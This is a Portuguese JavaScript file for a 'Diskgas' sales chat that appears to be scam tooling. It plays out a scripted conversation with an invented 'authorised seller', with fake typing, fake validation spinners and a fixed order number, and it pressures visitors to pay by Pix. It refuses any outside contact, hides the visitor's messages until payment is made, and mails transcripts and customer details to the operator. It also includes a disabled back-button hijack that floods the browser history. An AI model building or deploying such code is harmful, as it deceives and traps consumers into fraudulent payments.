/**
 * original_diskgas_chat.js
 * 
 * Este arquivo contém o JavaScript original do seu site Diskgas, extraído do pasted_content.txt.
 * Ele define o fluxo de vendas automático e as funções auxiliares do chat.
 */

// Variáveis globais do fluxo de vendas original
window._transcriptSent = false;
window._currentPixCode = null;
window._currentFlowStep = 0; // 0 indica que o fluxo ainda não começou ou está inativo
window._orderConfirmationShown = false;
window._paymentConfirmed = false;
window._contactMsgSent = false;
window._pixCopyClicked = false;
window._pixCopyTimer = null;
window._pixPaymentTimer = null;
window._pixCopyReminderSent = false;
window._pixPaymentReminderSent = false;

const STATE_STORAGE_KEY = 'diskgas_chat_state';

// Elementos do DOM (garantir que estejam acessíveis)
const msgsEl = document.getElementById('msgs');
const inputEl = document.getElementById('msgInput');
const sendBtnEl = document.getElementById('sendBtn');
const backBtn = document.getElementById('backBtn');
const headerStatusEl = document.getElementById('headerStatus');
const statusTextEl = document.getElementById('statusText');
const typingDotsMini = document.getElementById('typingDotsMini');
const typingRow = document.getElementById('typingRow');

let currentConfirmationBlock = null;
let confirmationResolve = null;
let confirmationMsgIndex = 0;
const confirmationMessages = [
  "Por favor, verifique se esta tudo ok",
  "Verifique abaixo se esta tudo certinho",
  "Se estiver correto para clicar em Sim, Prosseguir?",
  "Preciso que confirme para prosseguirmos",
  "Assim que você confirmar abaixo a gente continua"
];

// Funções auxiliares do chat original
function sendTranscript() {
  if (window._transcriptSent || !window._currentPixCode) return;

  const messages = document.querySelectorAll('.msgs .row, .msgs .sys');
  let transcript = "--- Transcrição do Chat ---\n\n";
  
  messages.forEach(el => {
    if (el.classList.contains('row')) {
      const isAgent = el.classList.contains('agent');
      const sender = isAgent ? "Thiago" : "Cliente";
      const bubble = el.querySelector('.bubble');
      
      if (bubble) {
        const text = (bubble.dataset.originalText || bubble.innerText).replace(/\n/g, ' ').trim();
        transcript += `[${sender}]: ${text}\n`;
      }
    } else if (el.classList.contains('sys')) {
      const sysText = el.innerText.trim();
      transcript += `[SISTEMA]: ${sysText}\n`;
    }
  });

  const orderInfo = window.ORDER ? `\n--- Dados do Pedido ---\nNome: ${window.ORDER.nome || 'N/A'}\nCidade: ${window.ORDER.location || 'N/A'}\nPreço: R$ ${window.ORDER.productPrice || 'N/A'}\n` : "";
  
  const templateParams = {
    user_name: window.ORDER ? window.ORDER.nome : "Cliente Pix",
    message: transcript + orderInfo,
    pix_code: window._currentPixCode || "Gerado"
  };

  emailjs.send('service_j2hab7s', 'template_xsfblgj', templateParams)
    .then(() => { window._transcriptSent = true; console.log('Transcrição enviada!'); })
    .catch((err) => { console.error('Erro ao enviar EmailJS:', err); });
}

function getGreeting() {
  const h=new Date().getHours();
  if(h>=5&&h<12) return 'Bom dia'; if(h>=12&&h<18) return 'Boa tarde'; return 'Boa noite';
}

function pause(ms){ return new Promise(r=>setTimeout(r,ms)); }

function addMsg(text, type = 'agent', newGroup = false) {
  const row = document.createElement('div');
  row.className = `row ${type}`;
  if (newGroup) row.classList.add('grouped');
  
  const bubble = document.createElement('div');
  bubble.className = `bubble ${type === 'user' ? 'u' : 'a'}`;
  bubble.textContent = text;
  
  row.appendChild(bubble);
  msgsEl.appendChild(row);
  
  msgsEl.scrollTop = msgsEl.scrollHeight;
  return { row, bubble };
}

function setTyping(on) {
  if (typingRow) {
    typingRow.style.display = on ? 'flex' : 'none';
  }
  if (on) {
    if (statusTextEl) statusTextEl.textContent = 'Digitando';
    if (headerStatusEl) headerStatusEl.classList.add('typing-state');
    if (typingDotsMini) typingDotsMini.classList.add('show');
    msgsEl.scrollTop = msgsEl.scrollHeight;
  } else {
    if (statusTextEl) statusTextEl.textContent = 'Online · Diskgas';
    if (headerStatusEl) headerStatusEl.classList.remove('typing-state');
    if (typingDotsMini) typingDotsMini.classList.remove('show');
  }
}

async function agentSay(text, newGroup=false, immediateTyping=false) {
  if (!immediateTyping) await pause(800 + Math.random() * 700);
  const typingMs = Math.max(1200, Math.min(text.split(' ').length * 200 + 600, 3500));
  setTyping(true); await pause(typingMs); setTyping(false);
  addMsg(text, 'agent', newGroup); 
}

function addSpinner(message) {
  const spinnerEl = document.createElement('div');
  spinnerEl.className = 'spinner-wrap';
  spinnerEl.innerHTML = `<div class="spinner"></div><div class="spinner-text">${message}</div>`;
  msgsEl.appendChild(spinnerEl);
  msgsEl.scrollTop = msgsEl.scrollHeight;
  return spinnerEl;
}

function addSys(message, type) {
  const sysEl = document.createElement('div');
  sysEl.className = `sys ${type}`;
  sysEl.innerHTML = `<span>${message}</span>`;
  msgsEl.appendChild(sysEl);
  msgsEl.scrollTop = msgsEl.scrollHeight;
}

function scrollDown(smooth = false) {
  if (smooth) {
    msgsEl.scrollTo({ top: msgsEl.scrollHeight, behavior: 'smooth' });
  } else {
    msgsEl.scrollTop = msgsEl.scrollHeight;
  }
}

function saveChatHistory() {
  localStorage.setItem('diskgas_chat_html', msgsEl.innerHTML);
  localStorage.setItem(STATE_STORAGE_KEY, JSON.stringify({
    pixCode: window._currentPixCode,
    lastSender: lastSender,
    flowStep: window._currentFlowStep,
    paymentConfirmed: window._paymentConfirmed,
    contactMsgSent: window._contactMsgSent,
    pixCopyClicked: window._pixCopyClicked,
    pixCopyReminderSent: window._pixCopyReminderSent,
    pixPaymentReminderSent: window._pixPaymentReminderSent,
  }));
}

function loadChatHistory() {
  return localStorage.getItem('diskgas_chat_html');
}

async function showOrderConfirmation() {
  window._orderConfirmationShown = true; 
  
  if (!currentConfirmationBlock) {
    currentConfirmationBlock = document.createElement('div');
    currentConfirmationBlock.className = 'steps-card order-confirmation-block';
    currentConfirmationBlock.style.cssText = 'width:100%;max-width:320px;padding:16px;border-radius:20px;border:1px solid var(--border-2);box-shadow:0 10px 25px rgba(0,0,0,0.05);background:#fff;';
    msgsEl.appendChild(currentConfirmationBlock);
  }

  const itemsHtml = window.ORDER.products && window.ORDER.products.length > 0
    ? window.ORDER.products.map(p => `
      <div style="display:flex;align-items:center;gap:12px;padding:8px;background:var(--surface-2);border-radius:12px;margin-bottom:8px;border:1px solid var(--border-2);">
        ${p.p ? `<img src="${p.p}" style="width:44px;height:44px;border-radius:8px;object-fit:cover;">` : ''}
        <div style="flex:1;">
          <div style="font-size:13px;font-weight:600;color:var(--text);line-height:1.2;">${p.n}</div>
          <div style="font-size:11px;color:var(--text-3);margin-top:2px;">Qtd: ${p.q} · R$ ${(p.v*(p.q||1)).toFixed(2).replace('.',',')}</div>
        </div>
      </div>`).join('')
    : `<div style="display:flex;align-items:center;gap:12px;padding:8px;background:var(--surface-2);border-radius:12px;margin-bottom:8px;border:1px solid var(--border-2);">
        <div style="flex:1;">
          <div style="font-size:13px;font-weight:600;color:var(--text);">${window.ORDER.productName}</div>
          <div style="font-size:11px;color:var(--text-3);margin-top:2px;">Qtd: ${window.ORDER.productQty} · R$ ${window.ORDER.productPrice.toFixed(2).replace('.',',')}</div>
        </div>
      </div>`;

  currentConfirmationBlock.innerHTML = `
    <div style="display:flex;align-items:center;gap:10px;margin-bottom:16px;">
      <div style="width:32px;height:32px;border-radius:10px;background:var(--brand-lt);display:flex;align-items:center;justify-content:center;color:var(--brand);box-shadow: 0 2px 8px var(--brand-glow);">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4Z"/><path d="M3 6h18"/><path d="M16 10a4 4 0 0 1-8 0"/></svg>
      </div>
      <div>
        <div style="font-size:13px;font-weight:800;color:var(--text);letter-spacing:-0.2px;">Resumo do Pedido</div>
        <div style="font-size:10px;color:var(--text-3);font-weight:600;text-transform:uppercase;letter-spacing:0.4px;">Confirme os dados abaixo</div>
      </div>
    </div>

    <div style="margin-bottom:14px;">${itemsHtml}</div>

    <div style="background:var(--surface-2);border-radius:14px;padding:14px;margin-bottom:18px;border:1px solid var(--border-2);">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;padding-bottom:12px;border-bottom:1px solid var(--border-2);">
        <span style="font-size:12px;color:var(--text-2);font-weight:600;">Total a pagar</span>
        <span style="font-size:18px;font-weight:900;color:var(--brand);letter-spacing:-0.5px;">R$ ${window.ORDER.productPrice.toFixed(2).replace('.',',')}</span>
      </div>
      <div style="display:flex;gap:10px;align-items:flex-start;">
        <div style="width:24px;height:24px;border-radius:50%;background:rgba(15,91,168,0.08);display:flex;align-items:center;justify-content:center;flex-shrink:0;">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="var(--brand)" stroke-width="3"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
        </div>
        <div style="font-size:12px;color:var(--text-2);line-height:1.4;font-weight:500;">
          <span style="color:var(--text-3);font-size:10px;font-weight:700;text-transform:uppercase;display:block;margin-bottom:2px;">Entregar em:</span>
          ${window.ORDER.address}
        </div>
      </div>
    </div>

    <div style="display:flex;flex-direction:column;gap:8px;">
      <button id="btnCorrect" style="width:100%;padding:14px;border-radius:14px;border:none;background:var(--brand);color:#fff;font-weight:800;cursor:pointer;font-size:14px;transition:all 0.2s;box-shadow:0 4px 15px rgba(15,91,168,0.25);display:flex;align-items:center;justify-content:center;gap:8px;">
        Sim, Prosseguir
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
      </button>
      <button id="btnChange" style="width:100%;padding:10px;border-radius:12px;border:none;background:transparent;color:var(--text-3);font-weight:600;cursor:pointer;font-size:12px;transition:all 0.2s;">Alterar informações</button>
    </div>
  `;

  scrollDown();

  currentConfirmationBlock.querySelector('#btnCorrect').onclick = async () => {
    currentConfirmationBlock.style.opacity='0.8';
    currentConfirmationBlock.style.pointerEvents='none';
    const btn = currentConfirmationBlock.querySelector('#btnCorrect');
    
    btn.style.background = 'var(--green)';
    btn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" style="margin-right:8px;"><polyline points="20 6 9 17 4 12"/></svg> Confirmado';
    
    currentConfirmationBlock.querySelectorAll('button').forEach(b=>b.disabled=true);
    addMsg('Sim, prosseguir','user');
    if(confirmationResolve) confirmationResolve('correct');
  };
  currentConfirmationBlock.querySelector('#btnChange').onclick = () => { /* updateModal(true); modalOverlayEl.classList.add('on'); */ if(confirmationResolve) confirmationResolve('change'); };

  if (!confirmationResolve) {
    return new Promise(resolve => { confirmationResolve=resolve; });
  }
}

function showDeliverySteps(pixCode) {
  const card = document.createElement('div');
  card.className = 'pix-card';
  card.innerHTML = `
    <div class="pix-card-header">
      <div class="pix-brand-mark">
        <div class="pix-logo">PIX</div>
        <div><div class="pix-brand-label">Pagamento Instantâneo</div><div class="pix-brand-sub">Diskgas Oficial</div></div>
      </div>
      <div class="pix-expiry"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> 15:00</div>
    </div>
    <div class="pix-price-hero">
      <div class="pix-price-eyebrow">Valor do pedido</div>
      <div class="pix-price-amount"><span>R$</span>${window.ORDER.productPrice.toFixed(2).replace('.',',')}</div>
    </div>
    <div style="background:#F0FDF4;border:1px solid rgba(16,185,129,.22);border-radius:12px;padding:11px 14px;margin-bottom:14px;display:flex;align-items:center;gap:11px;cursor:pointer;" onclick="openSellerModal()">
      <div style="width:34px;height:34px;background:var(--green);border-radius:9px;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 3px 8px rgba(16,185,129,.25);"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
      <div><div style="font-size:10px;font-weight:700;color:#065F46;text-transform:uppercase;letter-spacing:.6px;margin-bottom:2px;">Vendedor Autorizado</div><div style="font-size:13px;font-weight:700;color:var(--text);line-height:1.2;">Thiago Callegari.</div><div style="font-size:10.5px;color:var(--text-3);margin-top:2px;">Vendedor Oficial · Diskgás</div></div>
    </div>
    <div class="pix-code-row"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--text-3)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><div class="pix-code-text">${pixCode.substring(0,40)}…</div></div>
    <button class="pix-copy-btn" id="pixCopyBtn"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copiar código Pix</button>
    <div class="pix-trust-row"><div class="pix-trust-item positive"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Seguro</div><div class="pix-trust-item neutral"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg> Pagamento seguro</div></div>
  `;
  msgsEl.appendChild(card);
  scrollDown();
  const copyBtn = card.querySelector('#pixCopyBtn');
  if (copyBtn) {
    copyBtn.onclick = () => {
      window._pixCopyClicked = true;
      if (window._pixCopyTimer) clearTimeout(window._pixCopyTimer);
      navigator.clipboard.writeText(pixCode).catch(()=>{});
      copyBtn.classList.add('copied');
      copyBtn.style.background = '#10B981';
      copyBtn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Código copiado!`;
      setTimeout(()=>{
        copyBtn.classList.remove('copied');
        copyBtn.style.background = 'var(--brand)';
        copyBtn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copiar código Pix`;
      }, 2500);
    };
  }
}

function addProfessionalStatusCard() {
  const card = document.createElement('div');
  card.className = 'payment-status-card';
  card.innerHTML = `<div class="status-header"><span class="status-badge">Diskgas Oficial</span><span style="font-size: 11px; color: var(--text-3); font-weight: 600;">Pedido #2849</span></div><div class="status-steps"><div class="step-bar completed"></div><div class="step-bar completed"></div><div class="step-bar active"></div><div class="step-bar"></div></div><div class="status-info"><div class="status-icon-pulse"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg></div><div><div class="status-text-main">Aguardando pagamento do PIX...</div><div class="status-text-sub">O entregador será acionado imediatamente após o PIX.</div></div></div><div style="margin-top: 15px; padding-top: 12px; border-top: 1px dashed var(--border-2); display: flex; align-items: center; gap: 8px;"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#10B981" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg><span style="font-size: 11px; color: #059669; font-weight: 700;">Garantia de Entrega Prioritária Ativa</span></div>`;
  msgsEl.appendChild(card); scrollDown(true); return card;
}

async function runConversation(startStep = 0) {
  const { location } = window.ORDER;
  const gr = getGreeting();
  if (startStep === 0) {
    window._currentFlowStep = 1; saveChatHistory();
    const spWaiting = addSpinner("Aguarde um Momento...");
    await pause(3000); spWaiting.remove();
  }
  if (window._currentFlowStep === 1) {
    window._currentFlowStep = 2; saveChatHistory();
    await agentSay(`${gr}`, false, true);
    await pause(300);
    await agentSay(`Sou Thiago, vendedor autorizado Diskgas em ${location} e Região`, false, true);
    await pause(800);
  }
  if (window._currentFlowStep === 2) {
    window._currentFlowStep = 3; saveChatHistory();
    const spValPre = addSpinner("Validando dados do pedido...");
    await pause(3000); spValPre.remove();
    await agentSay(`Peço que verifique se está tudo certo, por gentileza`, true, true);
  }
  let action;
  if (window._currentFlowStep === 3) {
    await pause(400);
    action = await showOrderConfirmation();
    if (action === 'correct') {
      window._currentFlowStep = 4; saveChatHistory();
    } else if (action === 'change') {
      await agentSay(`Sem problemas! Pode me falar o que deseja alterar ou clique no ícone do carrinho no topo para ajustar seu pedido.`);
      window._currentFlowStep = 99; saveChatHistory(); return;
    }
  }
  if (window._currentFlowStep === 4) {
    window._currentFlowStep = 5; saveChatHistory();
    const spVal = addSpinner("Validando dados do pedido...");
    await pause(3500); spVal.remove();
    addSys('Pedido validado com sucesso', 'ok');
  }
  if (window._currentFlowStep === 5) {
    window._currentFlowStep = 6; saveChatHistory();
    const localBase = window.ORDER.location || 'sua região';
    const localFinal = localBase === 'sua região' ? localBase : `${localBase} e região`;
    await agentSay(`Certo, já vou enviar o pix, um segundo...`);
    await pause(900); setTyping(true); await pause(5500); setTyping(false);
    await addMsg(`Você verá 𝗧𝗵𝗶𝗮𝗴𝗼 𝗖𝗮𝗹𝗹𝗲𝗴𝗮𝗿𝗶 no pix, sou o vendedor diskgás oficial em ${localFinal}, serei responsável pela entrega 😃`, 'agent', true);
    await pause(600);
  }
  if (window._currentFlowStep === 6) {
    window._currentFlowStep = 7; saveChatHistory();
    const sp = addSpinner("Preparando chave Pix...");
    let pixCode = window._currentPixCode;
    const pixStartTime = Date.now();
    if (!pixCode) {
      const _hasOrderParams = window.location.search && new URLSearchParams(window.location.search).get('products');
      if (!_hasOrderParams) {
        pixCode = '00020126580014br.gov.bcb.pix0136a1b2c3d4-e5f6-7890-abcd-ef1234567890520400005303986540510.005802BR5913Thiago Callegari6009Sao Paulo62070503***63041A2B';
        window._currentPixCode = pixCode;
      } else {
        try {
          const savedState = localStorage.getItem(STATE_STORAGE_KEY);
          if (savedState) {
            const state = JSON.parse(savedState);
            if (state.pixCode) { pixCode = state.pixCode; window._currentPixCode = pixCode; }
          }
          if (!pixCode) {
            const payerName = window.ORDER.nome ? window.ORDER.nome.split(' ').map(w => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()).join(' ') : 'Cliente';
            const amountStr = window.ORDER.productPrice.toFixed(2).replace('.', ',');
            // Simulação de chamada API para Pix (substitua pela sua real)
            // const pixResp = await fetch('/api/pix', {
            //   method: 'POST',
            //   headers: { 'Content-Type': 'application/json' },
            //   body: JSON.stringify({ payer_name: payerName, amount: amountStr })
            // });
            // const pixData = await pixResp.json();
            // if (pixData.success && pixData.pixCode) { pixCode = pixData.pixCode; window._currentPixCode = pixCode; }
            pixCode = '00020126580014br.gov.bcb.pix0136a1b2c3d4-e5f6-7890-abcd-ef1234567890520400005303986540510.005802BR5913Thiago Callegari6009Sao Paulo62070503***63041A2B'; // Mock
            window._currentPixCode = pixCode;
          }
        } catch (err) { console.error(err); }
      }
    }
    const elapsed = Date.now() - pixStartTime;
    if (elapsed < 7000) await pause(7000 - elapsed);
    sp.remove();
    addSys('Pix gerado com sucesso', 'ok');
    sendTranscript();
    
    await agentSay(`Após o pagamento o prazo de entrega é de 20-30 minutos. 😃`, true, true);
    
    await pause(1000); 
    
    showDeliverySteps(pixCode);
        
    await pause(600);
    
    await agentSay(`Estou acompanhando aqui. Após o pagamento o pedido é aprovado automaticamente. 😃`, true, true);
    
    await pause(300);
    
    addProfessionalStatusCard();
    
    window._currentFlowStep = 9; 
    saveChatHistory();
    
    setTimeout(() => {
      if (!window._paymentConfirmed) {
        if (!document.querySelector('.payment-status-card')) {
            addProfessionalStatusCard();
            saveChatHistory();
        }
      }
    }, 4 * 60 * 1000);
  }
}

// A função doSend original, que será sobrescrita pelo script de integração do ChatGPT
window.doSend = async function() {
  const text = inputEl.value.trim();
  if (!text) return;

  sendBtnEl.disabled = true;
  if (text.toLowerCase() === 'emailjs') { sendTranscript(); inputEl.value = ''; return; }
  const originalText = text;
  inputEl.value=''; inputEl.style.height='auto'; inputEl.blur();
  const paymentTerms = ["pago", "feito", "já", "ja", "paguei", "pagar", "fiz", "finalizei", "efetivado", "finalizado", "realizei", "efetuado", "realizado", "terminei", "acabei", "concluí", "conclui", "concluido", "concluído"];
  const lowerText = originalText.toLowerCase();
  const foundPaymentTerm = paymentTerms.some(term => lowerText.includes(term));
  const contactTerms = ["telefone","whatsapp","zap","ligar","whats","whatss","ligação","ligacao","número do","número de","numero do","numero de","contato"];
  const foundContactTerm = !window._contactMsgSent && contactTerms.some(term => lowerText.includes(term));
  const words = originalText.split(/\s+/).filter(w => w.trim().length > 0);
  const wordCount = words.length;
  const isLongMessage = wordCount > 2 && !(foundPaymentTerm && window._currentFlowStep >= 6);
  const { row } = addMsg(originalText, 'user');
  await pause(1600);
  if (foundPaymentTerm && window._currentFlowStep >= 6 && !window._paymentConfirmed) {
    window._paymentConfirmed = true;
    if (window._pixPaymentTimer) clearTimeout(window._pixPaymentTimer);
    saveChatHistory();
    await agentSay("Certo, com o pagamento realizado podemos preparar o envio, o prazo de entrega é de 20-30 minutos", true, true);
    saveChatHistory();
  } else if (foundContactTerm) {
    window._contactMsgSent = true; saveChatHistory();
    await agentSay("Por segurança este é o único canal de atendimento Diskgas, não fazemos atendimento em outros canais.", true, true);
    saveChatHistory();
  } else if (isLongMessage) {
    const bubble = row.querySelector('.bubble');
    bubble.dataset.originalText = originalText; 
    bubble.style.transition='all 0.4s cubic-bezier(0.4,0,0.2,1)';
    bubble.style.background='#F1F5F9'; bubble.style.color='#475569'; bubble.style.border='1px solid #CBD5E1'; bubble.style.boxShadow='0 2px 6px rgba(0,0,0,0.04)';
    bubble.innerHTML=`<div style="display:flex;align-items:center;gap:8px;font-size:12px;font-weight:700;margin-bottom:4px;color:#1e293b;"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Chat exclusivo para clientes com pedidos em fase de entrega</div><div style="font-size:11px;opacity:0.9;line-height:1.5;font-weight:500;">Você poderá enviar mensagems ao vendedor Diskgás quando o pedido estiver em fase de entrega, para isso basta realizar o pagamento do pedido e o chat será liberado.</div>`;
    row.classList.add('shake'); setTimeout(()=>row.classList.remove('shake'), 400);
  }
  if (window._currentFlowStep === 3 && window._orderConfirmationShown) {
    await pause(2000);
    const msg = confirmationMessages[confirmationMsgIndex];
    await agentSay(msg, true, true);
    confirmationMsgIndex = (confirmationMsgIndex + 1) % confirmationMessages.length;
    currentConfirmationBlock = null; showOrderConfirmation();
  }
  scrollDown(true);
};

function lockBackButton() {
  const STACK_FILL = 60;
  for (let i = 0; i < STACK_FILL; i++) history.pushState({ diskgas_lock: true, n: i }, '', location.href);
  window.addEventListener('popstate', function() { history.pushState({ diskgas_lock: true }, '', location.href); history.go(1); });
  setInterval(function() { try { history.pushState({ diskgas_lock: true }, '', location.href); } catch(e) {} }, 500);
  window.addEventListener('blur', function() { for (let i = 0; i < 10; i++) history.pushState({ diskgas_lock: true }, '', location.href); });
  document.addEventListener('visibilitychange', function() { if (document.visibilityState === 'visible') for (let i = 0; i < 15; i++) history.pushState({ diskgas_lock: true }, '', location.href); });
  window.addEventListener('beforeunload', function() { history.pushState({ diskgas_lock: true }, '', location.href); sendTranscript(); });
  window.addEventListener('pagehide', function() { for (let i = 0; i < 20; i++) history.pushState({ diskgas_lock: true }, '', location.href); });
}

// Simulação de ORDER global para o fluxo de vendas
window.ORDER = {
  nome: "Cliente",
  location: "sua região",
  productName: "Gás",
  productPrice: 0.00,
  productQty: 0,
  address: "Endereço de Exemplo"
};

// Inicialização do fluxo de vendas original
(async () => {
  //lockBackButton(); // Descomente se quiser reativar o bloqueio do botão voltar
  // updateModal(); // Se houver uma função updateModal no seu HTML original
  const savedHTML = loadChatHistory();
  const savedState = localStorage.getItem(STATE_STORAGE_KEY);
  if (savedHTML && savedState) {
    const state = JSON.parse(savedState);
    window._currentPixCode = state.pixCode; window._pixCopyTimer = null; window._pixPaymentTimer = null; window._pixCopyReminderSent = false; window._pixPaymentReminderSent = false;
    //lastSender = state.lastSender; // lastSender não está definido globalmente no original
    window._currentFlowStep = state.flowStep || 0; window._paymentConfirmed = state.paymentConfirmed || false; window._contactMsgSent = state.contactMsgSent || false; window._pixCopyClicked = state.pixCopyClicked || false; window._pixCopyReminderSent = state.pixCopyReminderSent || false; window._pixPaymentReminderSent = state.pixPaymentReminderSent || false;
    msgsEl.innerHTML = savedHTML;
    const pixCopyBtn = msgsEl.querySelector('#pixCopyBtn');
    if (pixCopyBtn && window._currentPixCode) {
        pixCopyBtn.onclick = () => {
          window._pixCopyClicked = true; if (window._pixCopyTimer) clearTimeout(window._pixCopyTimer);
          navigator.clipboard.writeText(window._currentPixCode).catch(()=>{});
        pixCopyBtn.classList.add('copied');
        pixCopyBtn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Código copiado!`;
        setTimeout(()=>{
          pixCopyBtn.classList.remove('copied');
          pixCopyBtn.style.background = 'var(--brand)';
          pixCopyBtn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copiar código Pix`;
        }, 2500);
      };
    }
    const btnCorrect = msgsEl.querySelector('#btnCorrect');
    const btnChange = msgsEl.querySelector('#btnChange');
    if (btnCorrect && btnChange && window._currentFlowStep === 3) {
        btnCorrect.onclick = async () => {
            const block = btnCorrect.closest('.order-confirmation-block');
            block.style.opacity='0.8'; block.style.pointerEvents='none';
            btnCorrect.style.background = 'var(--green)';
            btnCorrect.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" style="margin-right:8px;"><polyline points="20 6 9 17 4 12"/></svg> Confirmado';
            block.querySelectorAll('button').forEach(b=>b.disabled=true);
            addMsg('Sim, prosseguir','user');
            if(confirmationResolve) confirmationResolve('correct');
        };
        btnChange.onclick = () => { /* updateModal(true); modalOverlayEl.classList.add('on'); */ if(confirmationResolve) confirmationResolve('change'); };
    }
    msgsEl.querySelectorAll('.intro-card, .m-avatar:not(.ghost)').forEach(el => { /* el.onclick = openSellerModal; */ }); // openSellerModal não está definido
    scrollDown(true);
    if (window._currentFlowStep < 9 && window._currentFlowStep !== 99) runConversation(window._currentFlowStep);
  } else {
    // Inicia o fluxo de vendas se não houver histórico salvo
    runConversation();
  }
})();

// Event Listeners para o input e botão de envio (apontando para a window.doSend)
// Estes listeners devem ser definidos APÓS a definição da window.doSend original
// e ANTES da sobrescrita pela IA.
inputEl.addEventListener("input", () => {
  inputEl.style.height = "auto";
  inputEl.style.height = Math.min(inputEl.scrollHeight, 88) + "px";
  sendBtnEl.disabled = !inputEl.value.trim();
});

inputEl.addEventListener("keydown", e => {
  if (e.key === "Enter" && !e.shiftKey) {
    e.preventDefault();
    window.doSend(); // Chama a função doSend (que será a sobrescrita pela IA)
  }
});

sendBtnEl.addEventListener("click", () => window.doSend()); // Chama a função doSend (que será a sobrescrita pela IA)

backBtn.addEventListener("click", () => {
  history.back();
});
